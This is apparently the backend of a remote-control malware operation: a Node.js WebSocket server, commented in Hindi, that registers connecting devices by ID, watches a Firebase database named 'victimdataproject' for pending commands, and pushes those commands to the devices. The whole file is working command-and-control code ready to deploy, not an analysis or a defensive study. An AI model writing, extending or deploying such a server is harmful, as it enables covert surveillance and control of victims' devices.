const WebSocket = require('ws');
const admin = require('firebase-admin');

// --- कॉन्फ़िगरेशन ---
// अपनी service account key फ़ाइल का पथ
const serviceAccount = require('./serviceAccountKey.json'); 
// अपने Firebase Realtime Database का URL
const FIREBASE_DB_URL = 'https://victimdataproject-default-rtdb.firebaseio.com/'; 
// जिस पोर्ट पर WebSocket सर्वर चलेगा
const PORT = process.env.PORT || 8080; 
// --------------------

// Firebase एडमिन को शुरू करें
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: FIREBASE_DB_URL
});

const db = admin.database();
const wss = new WebSocket.Server({ port: PORT });

// कनेक्टेड डिवाइस को स्टोर करने के लिए एक मैप
const clients = new Map();

wss.on('connection', (ws) => {
  console.log('एक नया डिवाइस कनेक्ट हुआ।');

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      // जब डिवाइस अपनी पहचान भेजता है
      if (data.type === 'IDENTIFY' && data.deviceId) {
        const deviceId = data.deviceId;
        clients.set(deviceId, ws); // डिवाइस को मैप में जोड़ें
        console.log(`डिवाइस ${deviceId} ने अपनी पहचान बताई।`);
        
        // डिवाइस के लिए पुराने अनसुने कमांड भेजें (अगर कोई हों)
        sendPendingCommands(deviceId);
      }
    } catch (e) {
      console.error('अमान्य संदेश मिला:', message);
    }
  });

  ws.on('close', () => {
    // कनेक्शन बंद होने पर डिवाइस को मैप से हटाएं
    for (const [deviceId, clientWs] of clients.entries()) {
      if (clientWs === ws) {
        clients.delete(deviceId);
        console.log(`डिवाइस ${deviceId} डिस्कनेक्ट हो गया।`);
        break;
      }
    }
  });

  ws.on('error', (error) => {
    console.error('WebSocket में त्रुटि:', error);
  });
});

// Firebase में नए कमांड्स को सुनें
const commandsRef = db.ref('devices');
commandsRef.on('child_changed', (snapshot) => {
  const deviceId = snapshot.key;
  const deviceData = snapshot.val();
  
  if (deviceData.commands) {
    sendPendingCommands(deviceId);
  }
});

function sendPendingCommands(deviceId) {
    const ws = clients.get(deviceId);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        // डिवाइस कनेक्टेड नहीं है या कनेक्शन तैयार नहीं है
        return;
    }

    const deviceCommandsRef = db.ref(`devices/${deviceId}/commands`);
    deviceCommandsRef.once('value', (snapshot) => {
        const commands = snapshot.val();
        if (commands) {
            Object.keys(commands).forEach(commandId => {
                const commandDetails = commands[commandId];
                if (commandDetails && commandDetails.status === 'pending') {
                    // कमांड को डिवाइस पर भेजें
                    const commandToSend = { ...commandDetails, commandId: commandId };
                    ws.send(JSON.stringify(commandToSend));
                    console.log(`कमांड ${commandId} को डिवाइस ${deviceId} पर भेजा गया।`);
                }
            });
        }
    });
}

console.log(`WebSocket कंट्रोल सर्वर पोर्ट ${PORT} पर चल रहा है...`);